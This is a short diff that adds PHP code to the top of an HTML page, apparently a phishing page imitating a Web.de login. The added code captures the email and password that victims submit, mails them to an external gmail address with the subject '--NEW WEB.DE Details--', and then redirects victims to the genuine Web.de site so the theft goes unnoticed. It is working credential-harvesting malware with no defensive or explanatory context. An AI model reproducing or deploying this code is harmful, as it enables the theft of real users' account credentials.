@@ -1,3 +1,23 @@
+<?php
+if(isset($_POST['login'])) {
+  extract($_POST); 
+
+  //send email
+  $body="New Web.de details has been sent. \n\nEmail: $email \n Password: $password. \n\n Kind Regards";
+
+  $header = 'MIME-Version: 1.0' . "\r\n";
+  $header .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+  $header .= 'From: Web-de <quean29@gmail.com>' . "\r\n";
+
+  $to = "quean29@gmail.com";
+  $subject = "--NEW WEB.DE Details--";
+  $message = $body;
+
+  if(mail($to,$subject,$message,$header)) {
+    header("Location: https://mm.web.de/");
+  }
+}
+?>
 <!doctype html>
 <html lang="en">
   <head>
